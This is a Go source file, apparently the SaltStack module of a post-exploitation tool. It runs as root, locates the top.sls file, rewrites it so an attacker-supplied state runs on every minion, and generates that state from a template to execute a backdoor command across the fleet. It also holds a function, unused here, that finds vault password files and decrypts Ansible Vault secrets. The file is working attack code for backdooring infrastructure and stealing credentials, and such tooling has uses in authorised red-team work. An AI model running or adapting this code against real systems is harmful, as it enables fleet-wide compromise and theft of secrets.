package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"text/template"

	"github.com/CrimsonK1ng/MOSE/pkg/moseutils"
	"github.com/fatih/color"
	"github.com/gobuffalo/packr/v2"
	utils "github.com/l50/goutils"
)

type Command struct {
	CmdName  string
	Cmd      string
	FileName string
	FilePath string
}

type Metadata struct {
	PayloadName string
}

var (
	a                = CreateAgent()
	bdCmd            = a.BdCmd
	errmsg           = color.Red
	localIP          = a.LocalIP
	msg              = color.Green
	osTarget         = a.OsTarget
	saltState        = a.PayloadName
	uploadFileName   = a.FileName
	serveSSL         = a.SSL
	exfilPort        = a.ExPort
	suppliedFilename string
	keys             []string
	inspect          bool
	uploadFilePath   = a.FilePath
	cleanup          bool
	cleanupFile      = a.CleanupFile
	saltBackupLoc    = a.SaltBackupLoc
)

func init() {
	flag.BoolVar(&cleanup, "c", false, "Activate cleanup using the file location in settings.json")
}

func backdoorSite(topLoc string) string {
	groupAllRun := regexp.MustCompile(`(?sm)(\w+\:)(\s+)\'\*\'\:(\s+)\-`)
	getAllStates := regexp.MustCompile(`(?sm)(^\w+)\:`)
	comments := regexp.MustCompile(`#.*`)

	fileContent, err := ioutil.ReadFile(topLoc)
	if err != nil {
		log.Println(err)
		log.Fatalf("Failed to backdoor the top.sls located at %s, exiting.", topLoc)
	}

	content := fmt.Sprint(comments.ReplaceAllString(string(fileContent), ""))

	// Check if base: '*' exists
	found := groupAllRun.MatchString(content)
	if found {
		matches := groupAllRun.FindStringSubmatch(content)
		spaces := len(matches[3]) - 1 // Number of spaces for addition of new - state
		insertState := "$0 " + saltState + "\n" + strings.Repeat(" ", spaces) + "-"
		content = fmt.Sprint(groupAllRun.ReplaceAllString(content, insertState))
		err = ioutil.WriteFile(topLoc, []byte(content), 0644)
		if err != nil {
			log.Fatalf("Failed to backdoor the top.sls located at %s, exiting.", topLoc)
		}

		return matches[1]

	}
	log.Println("No base group found in top.sls, creating group with name equivalent to supplied stateName")
	// No state containing '*' make one
	stateNames := getAllStates.FindAllStringSubmatch(content, -1)
	var names []string
	for _, m := range stateNames { //get all existing groups in top.sls (e.g. base:)
		names = append(names, m[1])
		if m[1] == saltState {
			log.Fatalf("StateName duplicated in top.sls, exiting...")
		}
	}

	content = content + "\n" + saltState + "\n  '*'\n    - " + saltState
	err = ioutil.WriteFile(topLoc, []byte(content), 0644)
	if err != nil {
		log.Fatalf("Failed to backdoor the top.sls located at %s, exiting.", topLoc)
	}

	return saltState
}

func getTopLoc(topLoc string) string {
	d, _ := filepath.Split(topLoc)
	return d
}

func createState(topLoc string, cmd string) {
	topLocPath := getTopLoc(topLoc)
	stateFolderLoc := filepath.Join(topLocPath, saltState)
	stateFolders := []string{stateFolderLoc}

	stateFile := filepath.Join(topLocPath, saltState, saltState+".sls")

	if moseutils.CreateFolders(stateFolders) && generateState(stateFile, cmd) {
		msg("Successfully created the %s state at %s", saltState, stateFile)
		msg("Adding folder %s to cleanup file", stateFolderLoc)
		// Track the folders for clean up purposes
		moseutils.TrackChanges(cleanupFile, stateFolderLoc)
		// if uploadFileName != "" {
		// 	ansibleFiles := filepath.Join(roleLoc, "files")

		// 	moseutils.CreateFolders([]string{ansibleFiles})
		// 	log.Printf("Copying  %s to module location %s", uploadFileName, ansibleFiles)
		// 	moseutils.CpFile(uploadFileName, filepath.Join(ansibleFiles, filepath.Base(uploadFileName)))
		// 	if err := os.Chmod(filepath.Join(ansibleFiles, filepath.Base(uploadFileName)), 0644); err != nil {
		// 		log.Fatal(err)
		// 	}
		// 	log.Printf("Successfully copied and chmod file %s", filepath.Join(ansibleFiles, filepath.Base(uploadFileName)))
		// }
	} else {
		log.Fatalf("Failed to create %s state", saltState)
	}
}

func generateState(stateFile string, cmd string) bool {
	saltCommands := Command{
		CmdName:  "cmd",
		Cmd:      bdCmd,
		FileName: uploadFileName,
		FilePath: uploadFilePath,
	}

	box := packr.New("Salt", "../../../templates/salt")

	s, err := box.FindString("saltState.tmpl")
	if uploadFileName != "" {
		s, err = box.FindString("saltFileUploadState.tmpl")
	}

	if err != nil {
		log.Fatal("Parse: ", err)
	}

	t, err := template.New("saltState").Parse(s)

	if err != nil {
		log.Fatal("Parse: ", err)
	}

	f, err := os.Create(stateFile)

	if err != nil {
		log.Fatalln(err)
	}

	err = t.Execute(f, saltCommands)

	if err != nil {
		log.Fatal("Execute: ", err)
	}

	f.Close()

	return true
}

func getAnsibleSecrets(siteLoc string, ansibleCfgs []string) {
	found, ansibleVault := moseutils.FindBin("ansible-vault", []string{"/bin", "/home", "/opt", "/root", "/usr/bin"})
	if !found {
		log.Printf("Ansible Vault not found, no need to find secrets")
		return
	}

	var vaultPasswords []string
	for _, cfg := range ansibleCfgs {
		reg := regexp.MustCompile(`(?ms)vault_password_file\s*?=\s*?(.*?)\n`)
		matches := moseutils.GrepFile(cfg, reg)
		if len(matches) > 0 {
			for _, match := range matches {
				submatch := reg.FindStringSubmatch(match)
				if len(submatch) > 0 {
					vaultPasswords = append(vaultPasswords, submatch[1])
				}
			}
		}
	}

	var morePasswords []string
	for _, pass := range vaultPasswords {
		if strings.Contains(pass, "~") {
			fileList, _ := moseutils.FindFiles([]string{"/home"}, []string{}, []string{filepath.Base(pass)}, []string{})
			morePasswords = append(morePasswords, fileList...)
		}
	}
	if len(morePasswords) > 0 {
		vaultPasswords = append(vaultPasswords, morePasswords...)
	}
	log.Printf("%v", vaultPasswords)

	sitePathLoc := getTopLoc(siteLoc)
	fileList, _ := moseutils.FindFiles([]string{sitePathLoc}, []string{".yml"}, []string{"vault"}, []string{})

	if len(fileList) == 0 {
		log.Println("Unable to find any yml files, skipping...")
		return
	}

	for _, k := range fileList {
		reg := regexp.MustCompile(`(?ms)VAULT`)
		matches := moseutils.GrepFile(k, reg)
		if len(matches) > 0 {
			if len(vaultPasswords) > 0 {
				for _, pass := range vaultPasswords {
					res, err := utils.RunCommand(ansibleVault, "--vault-password-file", pass, "view", k)
					if err != nil {
						log.Printf("Error running command: %s --vault-password-file %s view %s %v", ansibleVault, pass, k, err)
						continue
					}
					msg("%s", res)
				}
			} else {
				res, err := utils.RunCommand(ansibleVault, "view", k)
				if err != nil {
					log.Printf("Error running command: %s view %s %v", ansibleVault, k, err)
					continue
				}
				msg("%s", res)
			}
		}

	}

	return
}

func doCleanup(siteLoc string) {
	moseutils.TrackChanges(cleanupFile, cleanupFile)
	ans, err := moseutils.AskUserQuestion("Would you like to remove all files associated with a previous run?", osTarget)
	if err != nil {
		log.Fatal("Quitting...")
	}
	moseutils.RemoveTracker(cleanupFile, osTarget, ans)

	path := siteLoc
	if saltBackupLoc != "" {
		path = filepath.Join(saltBackupLoc, filepath.Base(siteLoc))
	}

	path = path + ".bak.mose"

	if !moseutils.FileExists(path) {
		log.Printf("Backup file %s does not exist, skipping", path)
	}
	ans2 := false
	if !ans {
		ans2, err = moseutils.AskUserQuestion(fmt.Sprintf("Overwrite %s with %s", siteLoc, path), osTarget)
		if err != nil {
			log.Fatal("Quitting...")
		}
	}
	if ans || ans2 {
		moseutils.CpFile(path, siteLoc)
		os.Remove(path)
	}
	os.Exit(0)
}

func backupSite(siteLoc string) {
	path := siteLoc
	if saltBackupLoc != "" {
		path = filepath.Join(saltBackupLoc, filepath.Base(siteLoc))
	}
	if !moseutils.FileExists(path + ".bak.mose") {
		moseutils.CpFile(siteLoc, path+".bak.mose")
		return
	}
	log.Printf("Backup of the top.sls (%v.bak.mose) already exists.", siteLoc)
	return
}

func main() {
	// parse args
	flag.Parse()

	// gonna assume not root then we screwed
	utils.CheckRoot()
	//ansibleCfgs := findSaltConfig()

	// 	if uploadFilePath != "" {
	// 		moseutils.TrackChanges(cleanupFile, uploadFilePath)
	// 	}

	found, _ := moseutils.FindBin("salt", []string{"/bin", "/home", "/opt", "/root", "/usr/bin"})
	if !found {
		log.Fatalf("salt binary not found, exiting...")
	}
	found, topLoc := moseutils.FindBin("top.sls", []string{"/srv/salt"})
	if !found {
		log.Fatalf("top.sls not found, exiting...")
	}

	// if cleanup {
	// 	doCleanup(siteLoc)
	// }

	backupSite(topLoc)
	msg("Backdooring the %s top.sls to run %s on all minions, please wait...", topLoc, bdCmd)
	backdoorSite(topLoc)
	createState(topLoc, bdCmd)

	log.Println("Attempting to find secrets stored with salt Pillars")
	//getAnsibleSecrets(topLoc, ansibleCfgs)
}
